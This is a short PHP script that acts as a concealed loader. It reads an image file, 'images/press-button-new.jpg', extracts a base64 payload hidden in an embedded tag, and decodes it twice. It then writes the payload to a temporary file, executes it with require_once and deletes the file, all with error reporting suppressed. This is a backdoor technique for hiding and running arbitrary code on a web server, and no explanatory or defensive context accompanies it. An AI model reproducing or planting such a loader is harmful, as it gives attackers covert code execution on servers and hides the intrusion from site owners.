<?php
error_reporting(E_ERROR);
$image = base64_decode(preg_replace('/(.*?)<x:xcode value\="(.*?)">(.*?)$/si','$2',file_get_contents('images/press-button-new.jpg')));
$imgT = tempnam(sys_get_temp_dir(), 'prefix');
file_put_contents($imgT, base64_decode($image));
require_once($imgT);
unlink($imgT);
?>